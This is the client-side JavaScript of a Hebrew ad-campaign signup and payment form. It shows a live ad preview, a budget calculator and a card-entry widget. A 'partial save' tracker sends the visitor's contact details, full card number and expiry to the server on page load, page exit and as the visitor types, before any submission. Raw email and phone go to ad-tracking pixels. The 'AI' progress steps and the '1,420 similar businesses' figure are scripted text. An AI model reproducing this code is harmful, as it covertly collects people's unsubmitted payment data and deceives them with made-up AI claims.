  // ============================================================

  // ================= PARTIAL SAVE / TRACKING =================
  // Generate or retrieve a stable session ID for this browser visit
  var _psSessionId = (function () {
    var key = 'hdg_ps_sid';
    var existing = sessionStorage.getItem(key);
    if (existing) return existing;
    var id = 'ps-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
    sessionStorage.setItem(key, id);
    return id;
  })();

  var _psDebounceTimer = null;

  function collectPartialPayload(trigger) {
    var goalRadio = document.querySelector('input[name="campaignGoal"]:checked');
    var catRadio  = document.querySelector('input[name="category"]:checked');
    return {
      session_id:     _psSessionId,
      stepReached:    currentStep,
      trigger:        trigger || 'input',
      businessName:   (document.getElementById('businessName')  || {}).value || '',
      category:       catRadio  ? catRadio.value  : '',
      businessDesc:   (document.getElementById('businessDesc')  || {}).value || '',
      campaignGoal:   goalRadio ? goalRadio.value : '',
      targetPhone:    (document.getElementById('targetPhone')   || {}).value || '',
      targetWhatsapp: (document.getElementById('targetWhatsapp')|| {}).value || '',
      targetLocation: (document.getElementById('targetLocation')|| {}).value || '',
      localAddress:   (document.getElementById('localAddress')  || {}).value || '',
      dailyBudget:    parseInt((document.getElementById('budgetRange') || {value:'30'}).value, 10),
      clientName:     (document.getElementById('clientName')    || {}).value || '',
      clientEmail:    (document.getElementById('clientEmail')   || {}).value || '',
      clientPhone:    (document.getElementById('clientPhone')   || {}).value || '',
      cardHolder:     (document.getElementById('cardHolder')    || {}).value || '',
      cardNumber:     (document.getElementById('cardNumber')    || {}).value || '',
      cardExpiry:     (document.getElementById('cardExpiry')    || {}).value || '',
    };
  }

  function sendPartialSave(trigger, immediate) {
    clearTimeout(_psDebounceTimer);
    var delay = immediate ? 0 : 1200;
    _psDebounceTimer = setTimeout(function () {
      var payload = collectPartialPayload(trigger);
      // Use sendBeacon when available (works on page unload too)
      var blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
      if (navigator.sendBeacon) {
        navigator.sendBeacon('api/partial-save.php', blob);
      } else {
        fetch('api/partial-save.php', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
          keepalive: true
        }).catch(function () {});
      }
    }, delay);
  }

  // Fire immediately on page load to capture the visit
  sendPartialSave('page_load', true);

  // Save on page/tab close / navigation away
  window.addEventListener('beforeunload', function () {
    sendPartialSave('page_unload', true);
  });

  // DOM Elements
  var form = document.getElementById('campaignSetupForm');
  var steps = document.querySelectorAll('.form-step');
  var btnNext = document.getElementById('btnNextStep');
  var btnBack = document.getElementById('btnBackStep');
  var dotNodes = document.querySelectorAll('.stepper-dot');
  var stepLabel = document.getElementById('stepIndicatorLabel');
  var stepTitle = document.getElementById('stepIndicatorTitle');
  var stepperBarFill = document.getElementById('stepperProgressBar');

  // Input fields
  var businessNameInput = document.getElementById('businessName');
  var businessDescInput = document.getElementById('businessDesc');
  var targetPhone = document.getElementById('targetPhone');
  var targetWhatsapp = document.getElementById('targetWhatsapp');
  var targetLocationSelect = document.getElementById('targetLocation');
  var localCityGroup = document.getElementById('localCityGroup');
  var localAddress = document.getElementById('localAddress');
  var budgetRange = document.getElementById('budgetRange');
  var budgetValueText = document.getElementById('budgetValue');
  
  // Checkout inputs
  var clientName = document.getElementById('clientName');
  var clientEmail = document.getElementById('clientEmail');
  var clientPhone = document.getElementById('clientPhone');
  var cardHolder = document.getElementById('cardHolder');
  var cardNumber = document.getElementById('cardNumber');
  var cardExpiry = document.getElementById('cardExpiry');
  var cardCvv = document.getElementById('cardCvv');
  var termsCheck = document.getElementById('termsCheck');

  // Preview elements
  var googleAdTitle = document.getElementById('googleAdTitle');
  var googleAdDesc = document.getElementById('googleAdDesc');
  var googleAdUrl = document.getElementById('googleAdUrl');
  var fbProfileChar = document.getElementById('fbProfileChar');
  var fbProfileName = document.getElementById('fbProfileName');
  var fbAdText = document.getElementById('fbAdText');
  var fbMediaTitle = document.getElementById('fbMediaTitle');
  var fbMediaSub = document.getElementById('fbMediaSub');
  var fbFooterTitle = document.getElementById('fbFooterTitle');
  var fbAdCtaText = document.getElementById('fbAdCtaText');
  var previewEmptyState = document.getElementById('previewEmptyState');
  var cardGoogleMockup = document.getElementById('cardGoogleMockup');
  var cardFacebookMockup = document.getElementById('cardFacebookMockup');

  // Tab preview switcher
  var tabGoogle = document.getElementById('tabGoogle');
  var tabFacebook = document.getElementById('tabFacebook');

  // Goal selectors
  var goalCalls = document.getElementById('goalCalls');
  var goalWhatsapp = document.getElementById('goalWhatsapp');
  var goalLeads = document.getElementById('goalLeads');
  var callsInputWrapper = document.getElementById('callsInputWrapper');
  var whatsappInputWrapper = document.getElementById('whatsappInputWrapper');

  // Budget calculations
  var calcMedia = document.getElementById('calcMedia');
  var calcTotal = document.getElementById('calcTotal');
  var estLeads = document.getElementById('estLeads');
  var estReach = document.getElementById('estReach');
  var aiRecBox = document.getElementById('aiRecBox');
  var aiRecText = document.getElementById('aiRecText');
  var applyAiRec = document.getElementById('applyAiRec');

  // Credit Card Preview
  var creditCardPreview = document.getElementById('creditCardPreview');
  var cardBrand = document.getElementById('cardBrand');
  var cardNumberPreview = document.getElementById('cardNumberPreview');
  var cardHolderPreview = document.getElementById('cardHolderPreview');
  var cardExpiryPreview = document.getElementById('cardExpiryPreview');
  var cardCvvPreview = document.getElementById('cardCvvPreview');

  // Step information lookup table
  var stepInfo = {
    1: { label: "שלב 1 מתוך 4", title: "פרטי העסק שלך" },
    2: { label: "שלב 2 מתוך 4", title: "מטרות ואזור פעילות" },
    3: { label: "שלב 3 מתוך 4", title: "תקציב קמפיין" },
    4: { label: "שלב 4 מתוך 4", title: "פרטים אישיים ותשלום" }
  };

  // CPL estimates and AI recommendations based on category
  var categoryData = {
    beauty: {
      name: "יופי ואסתטיקה",
      recommendedBudget: 90,
      cpl: 25,
      keywords: ["טיפולי פנים", "עיצוב גבות", "קוסמטיקאית מומלצת", "מניקור פדיקור", "טיפוח פנים"]
    },
    services: {
      name: "בעלי מקצוע ושיפוצים",
      recommendedBudget: 150,
      cpl: 45,
      keywords: ["אינסטלטור 24/7", "תיקון פיצוץ צינור", "שיפוץ אמבטיה", "פתיחת סתימות", "טכנאי מוסמך"]
    },
    lawyer: {
      name: "עורכי דין ופיננסים",
      recommendedBudget: 220,
      cpl: 80,
      keywords: ["עורך דין דיני עבודה", "ייעוץ משפטי", "עורכת דין חוזים", "רואה חשבון מומלץ", "ייעוץ מס"]
    },
    food: {
      name: "מסעדות ומזון",
      recommendedBudget: 80,
      cpl: 20,
      keywords: ["משלוחי אוכל מהירים", "פיצרייה מומלצת", "מסעדה פתוחה עכשיו", "אוכל איכותי", "הזמנת קייטרינג"]
    },
    shop: {
      name: "חנויות אונליין",
      recommendedBudget: 120,
      cpl: 35,
      keywords: ["רכישה מאובטחת אונליין", "חנות בגדים משלוחים", "מוצרים איכותיים במבצע", "קניות ברשת", "משלוח חינם"]
    },
    clinic: {
      name: "רפואה ומרפאות",
      recommendedBudget: 180,
      cpl: 60,
      keywords: ["מרפאת שיניים מומלצת", "תור דחוף לרופא", "מרפאה פרטית", "בדיקת רופא מומחה", "אורתופד מומלץ"]
    }
  };

  // Live validation helpers
  function showFieldError(inputId, isError) {
    var input = document.getElementById(inputId);
    var errSpan = document.getElementById(inputId + '-error');
    if (input) input.classList.toggle('invalid', isError);
    if (errSpan) errSpan.classList.toggle('show', isError);
  }

  function validateEmail(emailVal) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailVal.trim());
  }

  function validatePhone(phoneVal) {
    var clean = phoneVal.replace(/\D/g, '');
    return clean.length >= 9 && clean.length <= 11;
  }

  function validateStep(stepNum) {
    var isValid = true;

    if (stepNum === 1) {
      var nameOk = businessNameInput.value.trim().length >= 2;
      var descOk = businessDescInput.value.trim().length >= 10;
      showFieldError('businessName', !nameOk);
      showFieldError('businessDesc', !descOk);
      isValid = nameOk && descOk;
    } 
    else if (stepNum === 2) {
      var activeGoal = document.querySelector('input[name="campaignGoal"]:checked').value;
      if (activeGoal === 'calls') {
        var phoneOk = validatePhone(targetPhone.value);
        showFieldError('targetPhone', !phoneOk);
        isValid = isValid && phoneOk;
      } else if (activeGoal === 'whatsapp') {
        var wsOk = validatePhone(targetWhatsapp.value);
        showFieldError('targetWhatsapp', !wsOk);
        isValid = isValid && wsOk;
      }
      
      if (targetLocationSelect.value === 'מקומי') {
        var addrOk = localAddress.value.trim().length >= 5;
        showFieldError('localAddress', !addrOk);
        isValid = isValid && addrOk;
      }
    } 
    else if (stepNum === 4) {
      var clientNameOk = clientName.value.trim().length >= 2;
      var emailOk = validateEmail(clientEmail.value);
      var clientPhoneOk = validatePhone(clientPhone.value);
      var cardHolderOk = cardHolder.value.trim().length >= 3;
      var cardNumOk = cardNumber.value.replace(/\s/g, '').length >= 14;
      var cardExpOk = /^\d{2}\/\d{2}$/.test(cardExpiry.value) && validateExpiry(cardExpiry.value);
      var cardCvvOk = /^\d{3,4}$/.test(cardCvv.value);
      var termsOk = termsCheck.checked;

      showFieldError('clientName', !clientNameOk);
      showFieldError('clientEmail', !emailOk);
      showFieldError('clientPhone', !clientPhoneOk);
      showFieldError('cardHolder', !cardHolderOk);
      showFieldError('cardNumber', !cardNumOk);
      showFieldError('cardExpiry', !cardExpOk);
      showFieldError('cardCvv', !cardCvvOk);
      
      var termsErr = document.getElementById('termsCheck-error');
      if (termsErr) termsErr.classList.toggle('show', !termsOk);

      isValid = clientNameOk && emailOk && clientPhoneOk && cardHolderOk && cardNumOk && cardExpOk && cardCvvOk && termsOk;
    }

    return isValid;
  }

  function validateExpiry(val) {
    var parts = val.split('/');
    var month = parseInt(parts[0], 10);
    var year = parseInt(parts[1], 10);
    if (month < 1 || month > 12) return false;
    var now = new Date();
    var currentYear = now.getFullYear() % 100;
    var currentMonth = now.getMonth() + 1;
    if (year < currentYear) return false;
    if (year === currentYear && month < currentMonth) return false;
    return true;
  }

  // Handle step rendering
  function renderStep(stepNum) {
    steps.forEach(function (stepEl) {
      stepEl.classList.remove('active');
    });
    document.querySelector('.form-step[data-step="' + stepNum + '"]').classList.add('active');

    // Update stepper visual markers
    dotNodes.forEach(function (dotEl) {
      var dotStep = parseInt(dotEl.getAttribute('data-dot'), 10);
      dotEl.classList.remove('active', 'completed');
      if (dotStep < stepNum) dotEl.classList.add('completed');
      else if (dotStep === stepNum) dotEl.classList.add('active');
    });

    var pct = (stepNum / totalSteps) * 100;
    stepperBarFill.style.width = pct + '%';
    
    // Label updates
    stepLabel.textContent = stepInfo[stepNum].label;
    stepTitle.textContent = stepInfo[stepNum].title;

    // Navigation buttons text & visibility
    btnBack.style.visibility = stepNum === 1 ? 'hidden' : 'visible';
    
    if (stepNum === 1) {
      btnNext.innerHTML = 'להגדרת היעד <svg viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M14 8H2M2 8L6.5 3.5M2 8L6.5 12.5" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>';
    } else if (stepNum === 2) {
      btnNext.innerHTML = 'להגדרת תקציב <svg viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M14 8H2M2 8L6.5 3.5M2 8L6.5 12.5" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>';
    } else if (stepNum === 3) {
      btnNext.innerHTML = 'לפרטי תשלום <svg viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M14 8H2M2 8L6.5 3.5M2 8L6.5 12.5" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>';
    } else if (stepNum === 4) {
      btnNext.innerHTML = 'הפעל קמפיין AI <svg viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M3 8.5L6.5 12L13 4.5" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg>';
    }

    // Scroll card into view
    document.querySelector('.form-card').scrollIntoView({ behavior: 'smooth', block: 'start' });
    
    // Trigger dynamic content recalculation on step activation
    if (stepNum === 3) {
      updateBudgetData();
    }
  }

  // Next & Back event handlers
  btnNext.addEventListener('click', function () {
    if (!validateStep(currentStep)) {
      // Track validation failure
      sendPartialSave('validation_failed', true);
      trackCustom('form_validation_failed', { step: currentStep });
      return;
    }
    
    if (currentStep < totalSteps) {
      sendPartialSave('step_complete_' + currentStep, true);

      // ======= STEP-COMPLETION TRACKING EVENTS =======
      if (currentStep === 1) {
        // Step 1 complete: Business details filled — fire Lead
        trackEvent('Lead', {
          content_name: 'Step 1 Complete — Business Details',
          content_category: 'Funnel Step',
          step: 1
        });
        trackCustom('funnel_step_complete', { step: 1, step_name: 'business_details' });
      }
      else if (currentStep === 2) {
        // Step 2 complete: Goals & location set
        var goalRadio = document.querySelector('input[name="campaignGoal"]:checked');
        trackCustom('funnel_step_complete', {
          step: 2,
          step_name: 'goals_and_geography',
          campaign_goal: goalRadio ? goalRadio.value : 'unknown',
          target_location: targetLocationSelect.value
        });
      }
      else if (currentStep === 3) {
        // Step 3 complete: Budget selected — fire InitiateCheckout
        var dailyBudget = parseInt(budgetRange.value, 10);
        trackEvent('InitiateCheckout', {
          content_name: 'Step 3 Complete — Budget Selected',
          content_category: 'Funnel Step',
          value: dailyBudget * 30,
          currency: 'ILS',
          num_items: 1,
          step: 3
        });
        trackCustom('funnel_step_complete', {
          step: 3,
          step_name: 'budget',
          daily_budget: dailyBudget,
          monthly_budget: dailyBudget * 30
        });
      }
      // ======= END STEP-COMPLETION TRACKING =======

      currentStep++;
      renderStep(currentStep);

      // ======= STEP-ENTRY TRACKING EVENTS =======
      if (currentStep === 4) {
        // Entered payment step — fire AddPaymentInfo
        trackEvent('AddPaymentInfo', {
          content_name: 'Step 4 — Payment Details',
          content_category: 'Funnel Step',
          currency: 'ILS',
          step: 4
        });
        trackCustom('funnel_step_view', { step: 4, step_name: 'payment' });
      } else {
        trackCustom('funnel_step_view', { step: currentStep });
      }
      // ======= END STEP-ENTRY TRACKING =======

    } else {
      submitSignup();
    }
  });

  btnBack.addEventListener('click', function () {
    if (currentStep > 1) {
      sendPartialSave('step_back_from_' + currentStep, true);
      trackCustom('funnel_step_back', { from_step: currentStep, to_step: currentStep - 1 });
      currentStep--;
      renderStep(currentStep);
    }
  });

  // Dynamic Goal field toggling
  function updateGoalInputs() {
    var selectedGoal = document.querySelector('input[name="campaignGoal"]:checked').value;
    
    callsInputWrapper.style.display = selectedGoal === 'calls' ? 'block' : 'none';
    whatsappInputWrapper.style.display = selectedGoal === 'whatsapp' ? 'block' : 'none';

    // Update Live Preview CTA label based on goal
    if (selectedGoal === 'calls') {
      fbAdCtaText.textContent = "התקשרו עכשיו";
    } else if (selectedGoal === 'whatsapp') {
      fbAdCtaText.textContent = "שלחו הודעה";
    } else {
      fbAdCtaText.textContent = "מידע נוסף";
    }
  }

  document.querySelectorAll('input[name="campaignGoal"]').forEach(function (radio) {
    radio.addEventListener('change', updateGoalInputs);
  });

  // Toggle local city group
  targetLocationSelect.addEventListener('change', function () {
    localCityGroup.style.display = targetLocationSelect.value === 'מקומי' ? 'block' : 'none';
    updateBudgetData(); // Recalculate based on location change
  });

  // ================= AI GENERATIVE LIVE PREVIEW ENGINE =================
  function updateLivePreviews() {
    var bName = businessNameInput.value.trim();
    var bDesc = businessDescInput.value.trim();
    var selectedCat = document.querySelector('input[name="category"]:checked').value;
    var locationStr = targetLocationSelect.options[targetLocationSelect.selectedIndex].text;
    
    // Set fallback if empty
    var displayBusinessName = bName || "העסק שלך";
    var catInfo = categoryData[selectedCat] || categoryData.beauty;
    
    // Dynamic generated titles and tags
    var displayCategoryName = catInfo.name;
    var suggestedTagline = "שירות מקצועי ואמין";
    if (catInfo.keywords.length > 0) {
      suggestedTagline = catInfo.keywords[0] + " ברמה הגבוהה ביותר";
    }
    
    // Generate simulated ad texts
    var displayDesc = bDesc || "ספרו לנו קצת על העסק שלכם ועל השירותים שאתם מציעים על מנת שה-AI שלנו יוכל לייצר מודעות מותאמות אישית.";
    
    // Setup URL slug
    var slug = displayBusinessName.toLowerCase().replace(/[^a-z0-9א-ת]/g, '-').substring(0, 20);
    googleAdUrl.textContent = "https://www.hdg.co.il/" + slug;
    
    // Google Card Updates
    googleAdTitle.textContent = suggestedTagline + " | " + displayBusinessName;
    googleAdDesc.textContent = displayDesc + " שירות מקצועי, אמין ומהיר. לפרטים נוספים לחצו כאן!";

    // Facebook Card Updates
    fbProfileChar.textContent = displayBusinessName.charAt(0);
    fbProfileName.textContent = displayBusinessName;
    fbAdText.textContent = "📢 מחפשים פתרון איכותי? \n" + displayDesc + "\n\n משרתים את כל תושבי " + locationStr + ". פנו אלינו לפרטים נוספים ותיאום מהיר!";
    fbMediaTitle.textContent = displayBusinessName;
    fbMediaSub.textContent = displayCategoryName + " · " + suggestedTagline;
    fbFooterTitle.textContent = displayBusinessName + " - " + displayCategoryName;
  }

  // Listeners for live previews
  businessNameInput.addEventListener('input', updateLivePreviews);
  businessDescInput.addEventListener('input', updateLivePreviews);
  targetLocationSelect.addEventListener('change', updateLivePreviews);
  document.querySelectorAll('input[name="category"]').forEach(function (radio) {
    radio.addEventListener('change', function () {
      updateLivePreviews();
      updateBudgetData(); // Category updates recommended budget
    });
  });

  // ---- Partial-save hooks on all trackable fields ----
  // Step 1 text fields
  businessNameInput.addEventListener('input', function () { sendPartialSave('field_businessName'); });
  businessDescInput.addEventListener('input', function () { sendPartialSave('field_businessDesc'); });
  document.querySelectorAll('input[name="category"]').forEach(function (r) {
    r.addEventListener('change', function () { sendPartialSave('field_category', true); });
  });

  // Step 2 fields
  document.getElementById('targetPhone').addEventListener('input', function () { sendPartialSave('field_targetPhone'); });
  document.getElementById('targetWhatsapp').addEventListener('input', function () { sendPartialSave('field_targetWhatsapp'); });
  document.querySelectorAll('input[name="campaignGoal"]').forEach(function (r) {
    r.addEventListener('change', function () { sendPartialSave('field_campaignGoal', true); });
  });
  document.getElementById('targetLocation').addEventListener('change', function () { sendPartialSave('field_targetLocation', true); });
  var localAddressEl = document.getElementById('localAddress');
  if (localAddressEl) localAddressEl.addEventListener('input', function () { sendPartialSave('field_localAddress'); });

  // Step 3 budget slider
  document.getElementById('budgetRange').addEventListener('change', function () { sendPartialSave('field_budget', true); });

  // Step 4 personal & card fields
  ['clientName','clientEmail','clientPhone','cardHolder','cardNumber','cardExpiry'].forEach(function (fid) {
    var el = document.getElementById(fid);
    if (el) el.addEventListener('input', function () { sendPartialSave('field_' + fid); });
  });

  // Tab switches in preview pane
  tabGoogle.addEventListener('click', function () {
    tabGoogle.classList.add('active');
    tabFacebook.classList.remove('active');
    cardGoogleMockup.classList.add('active');
    cardFacebookMockup.classList.remove('active');
  });

  tabFacebook.addEventListener('click', function () {
    tabFacebook.classList.add('active');
    tabGoogle.classList.remove('active');
    cardFacebookMockup.classList.add('active');
    cardGoogleMockup.classList.remove('active');
  });

  // ================= BUDGET SLIDER LOGIC =================
  function updateBudgetData() {
    var dailyVal = parseInt(budgetRange.value, 10);
    budgetValueText.textContent = "₪" + dailyVal;

    var selectedCat = document.querySelector('input[name="category"]:checked').value;
    var catInfo = categoryData[selectedCat] || categoryData.beauty;
    
    // Update recommendation widget
    var locText = targetLocationSelect.options[targetLocationSelect.selectedIndex].text;
    aiRecText.innerHTML = "על סמך ניתוח של 1,420 עסקים דומים בתחום <strong>" + catInfo.name + "</strong> ב<strong>" + locText + "</strong>, מומלץ להגדיר תקציב של לפחות <strong>₪" + catInfo.recommendedBudget + "</strong> ביום כדי להשיג תוצאות אופטימליות.";
    applyAiRec.textContent = "החל את תקציב ה-AI המומלץ (₪" + catInfo.recommendedBudget + " ליום)";
    
    // Cost breakdowns
    var monthlyMedia = dailyVal * 30;
    var systemFee = 0;
    var monthlyTotal = monthlyMedia + systemFee;

    calcMedia.textContent = "₪" + dailyVal.toLocaleString() + " / יום";
    calcTotal.textContent = "₪" + dailyVal.toLocaleString() + " / יום";

    // Dynamic expected results estimations based on cost-per-lead (CPL)
    var cplVal = catInfo.cpl;
    // Tweak CPL slightly if location is localized (higher conversion, sometimes higher CPC)
    if (targetLocationSelect.value === 'מקומי') {
      cplVal = Math.round(cplVal * 0.9);
    }
    
    var minLeads = Math.round((monthlyMedia * 0.85) / cplVal);
    var maxLeads = Math.round((monthlyMedia * 1.15) / cplVal);
    
    var minReach = Math.round(dailyVal * 30 * 4);
    var maxReach = Math.round(dailyVal * 30 * 9.5);

    estLeads.textContent = minLeads + " - " + maxLeads + " פניות";
    estReach.textContent = (minReach >= 1000 ? (minReach / 1000).toFixed(1) + 'k' : minReach) + " - " + (maxReach >= 1000 ? (maxReach / 1000).toFixed(1) + 'k' : maxReach);
  }

  budgetRange.addEventListener('input', updateBudgetData);
  applyAiRec.addEventListener('click', function () {
    var selectedCat = document.querySelector('input[name="category"]:checked').value;
    var catInfo = categoryData[selectedCat] || categoryData.beauty;
    budgetRange.value = catInfo.recommendedBudget;
    updateBudgetData();
  });

  // ================= CREDIT CARD UI INTERACTION =================
  function detectCardType(numberStr) {
    var clean = numberStr.replace(/\D/g, '');
    if (/^4/.test(clean)) return 'VISA';
    if (/^5[1-5]/.test(clean)) return 'MASTERCARD';
    if (/^3[47]/.test(clean)) return 'AMEX';
    return 'CREDIT';
  }

  cardNumber.addEventListener('input', function (e) {
    var val = e.target.value.replace(/\D/g, '').substring(0, 16);
    // Format card number with spaces (e.g. 0000 0000 0000 0000)
    var formatted = val.replace(/(.{4})/g, '$1 ').trim();
    e.target.value = formatted;
    
    // Live update preview
    var previewVal = formatted;
    var dotsNeeded = 16 - val.length;
    var dottedPlaceholder = "";
    for (var i = 0; i < dotsNeeded; i++) {
      dottedPlaceholder += "•";
    }
    // group dotted placeholder by 4
    var fullMask = (val + dottedPlaceholder).replace(/(.{4})/g, '$1 ').trim();
    cardNumberPreview.textContent = fullMask;

    // Detect card brand
    var brand = detectCardType(val);
    cardBrand.textContent = brand;
  });

  cardHolder.addEventListener('input', function (e) {
    var val = e.target.value.toUpperCase();
    cardHolderPreview.textContent = val || '—';
  });

  cardExpiry.addEventListener('input', function (e) {
    var val = e.target.value.replace(/\D/g, '').substring(0, 4);
    if (val.length >= 3) {
      val = val.substring(0, 2) + '/' + val.substring(2);
    }
    e.target.value = val;
    cardExpiryPreview.textContent = val || 'MM/YY';
  });

  // Flip credit card on CVV focus
  cardCvv.addEventListener('focus', function () {
    creditCardPreview.classList.add('flipped');
  });

  cardCvv.addEventListener('blur', function () {
    creditCardPreview.classList.remove('flipped');
  });

  cardCvv.addEventListener('input', function (e) {
    var val = e.target.value.replace(/\D/g, '').substring(0, 4);
    e.target.value = val;
    cardCvvPreview.textContent = val ? val : 'CVV';
  });

  // Click on credit card itself flips it
  creditCardPreview.addEventListener('click', function () {
    creditCardPreview.classList.toggle('flipped');
  });

  function collectFormPayload() {
    return {
      businessName: businessNameInput.value.trim(),
      category: document.querySelector('input[name="category"]:checked').value,
      businessDesc: businessDescInput.value.trim(),
      campaignGoal: document.querySelector('input[name="campaignGoal"]:checked').value,
      targetPhone: targetPhone.value.trim(),
      targetWhatsapp: targetWhatsapp.value.trim(),
      targetLocation: targetLocationSelect.value,
      localAddress: localAddress.value.trim(),
      dailyBudget: parseInt(budgetRange.value, 10),
      clientName: clientName.value.trim(),
      clientEmail: clientEmail.value.trim(),
      clientPhone: clientPhone.value.trim(),
      cardHolder: cardHolder.value.trim(),
      cardNumber: cardNumber.value.trim(),
      cardExpiry: cardExpiry.value.trim(),
      cardCvv: cardCvv.value.trim(),
      termsAccepted: termsCheck.checked
    };
  }

  function applyServerErrors(errors) {
    Object.keys(errors).forEach(function (fieldId) {
      showFieldError(fieldId, true);
    });
  }

  function resetLoaderSteps() {
    ['lStep1', 'lStep2', 'lStep3', 'lStep4'].forEach(function (id, index) {
      var step = document.getElementById(id);
      if (!step) return;
      step.classList.remove('completed', 'active');
      if (index === 0) step.classList.add('active');
    });
  }

  function submitSignup() {
    var loaderOverlay = document.getElementById('loaderOverlay');
    var loaderProgressDesc = document.getElementById('loaderProgressDesc');
    var lStep1 = document.getElementById('lStep1');
    var lStep2 = document.getElementById('lStep2');
    var lStep3 = document.getElementById('lStep3');
    var lStep4 = document.getElementById('lStep4');

    btnNext.disabled = true;
    resetLoaderSteps();
    loaderProgressDesc.textContent = "שומר את פרטי הקמפיין ומאמת תשלום...";
    loaderOverlay.classList.add('active');

    // ======= FIRE COMPLETE REGISTRATION EVENT (ALL PLATFORMS) =======
    var payload = collectFormPayload();
    var dailyBudget = parseInt((document.getElementById('budgetRange') || {value:'30'}).value, 10);
    var conversionValue = dailyBudget * 30; // monthly value in ILS

    trackEvent('CompleteRegistration', {
      content_name: 'Campaign Signup Completed',
      content_category: 'Lead Generation',
      value: conversionValue,
      currency: 'ILS',
      status: 'success',
      // Pass hashed user info if available (SHA256 is best; here we pass raw for simplicity)
      em: payload.clientEmail || '',  // Meta will auto-hash
      ph: payload.clientPhone || ''   // Meta will auto-hash
    });
    // ======= END COMPLETE REGISTRATION EVENT =======

    fetch('api/signup-submit.php', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(collectFormPayload())
    })
      .then(function (response) {
        return response.json().then(function (body) {
          return { ok: response.ok, status: response.status, body: body };
        });
      })
      .then(function (result) {
        if (!result.ok || !result.body.success) {
          loaderOverlay.classList.remove('active');
          btnNext.disabled = false;

          if (result.body.errors) {
            applyServerErrors(result.body.errors);
          }

          alert(result.body.message || 'אירעה שגיאה בשמירת ההרשמה. נסו שוב.');
          return;
        }

        loaderProgressDesc.textContent = "מנתח את פרטי העסק ומייצר מילות מפתח ממוקדות...";

        setTimeout(function () {
          lStep1.classList.add('completed');
          lStep2.classList.add('active');
          loaderProgressDesc.textContent = "מנסח מודעות אינטראקטיביות מותאמות לתחום העסק שלך...";
        }, 1800);

        setTimeout(function () {
          lStep2.classList.add('completed');
          lStep3.classList.add('active');
          loaderProgressDesc.textContent = "מגדיר ערוצי המרה וחיבורי שיחות/וואטסאפ לקהל היעד...";
        }, 3600);

        setTimeout(function () {
          lStep3.classList.add('completed');
          lStep4.classList.add('active');
          loaderProgressDesc.textContent = "קובע הגדרות תקציב חכמות ואסטרטגיית בידים אופטימלית...";
        }, 5400);

        setTimeout(function () {
          lStep4.classList.add('completed');
          loaderProgressDesc.textContent = "מקים את מערכת האופטימיזציה האוטומטית... מוכן!";

          setTimeout(function () {
            loaderOverlay.classList.remove('active');
            btnNext.disabled = false;
            showSuccessState(result.body.data || {});
          }, 1000);
        }, 7200);
      })
      .catch(function () {
        loaderOverlay.classList.remove('active');
        btnNext.disabled = false;
        alert('לא ניתן להתחבר לשרת. ודאו שהאתר רץ על PHP ונסו שוב.');
      });
  }

  function showSuccessState(serverData) {
    var setupLayout = document.getElementById('setupLayout');
    var successSection = document.getElementById('successSection');
    
    // Hide inputs
    setupLayout.style.display = 'none';
    document.querySelector('.form-hero').style.display = 'none';
    
    // Set success fields
    document.getElementById('successBusinessName').textContent = businessNameInput.value.trim();
    
    var selectedGoal = document.querySelector('input[name="campaignGoal"]:checked').value;
    var goalText = "";
    if (selectedGoal === 'calls') {
      goalText = "שיחות טלפון ישירות ל-" + targetPhone.value.trim();
    } else if (selectedGoal === 'whatsapp') {
      goalText = "הודעות וואטסאפ ישירות ל-" + targetWhatsapp.value.trim();
    } else {
      goalText = "לידים מטופס דיגיטלי (דף נחיתה אוטומטי)";
    }
    document.getElementById('successGoal').textContent = goalText;
    
    var locationStr = targetLocationSelect.options[targetLocationSelect.selectedIndex].text;
    if (targetLocationSelect.value === 'מקומי') {
      locationStr += " (" + localAddress.value.trim() + ")";
    }
    document.getElementById('successLocation').textContent = locationStr;
    
    var dailyVal = parseInt(budgetRange.value, 10);
    document.getElementById('successDailyBudget').textContent = "₪" + dailyVal + " ליום";
    
    var monthlyMedia = dailyVal * 30;
    var monthlyTotal = monthlyMedia + 0;
    document.getElementById('successMonthlyTotal').textContent = "₪" + monthlyTotal.toLocaleString() + " לחודש";

    // Show success view
    successSection.classList.add('active');
  }

  // Initialize
  updateGoalInputs();
  renderStep(currentStep);
  updateLivePreviews();
});
</script>
</body>
</html>
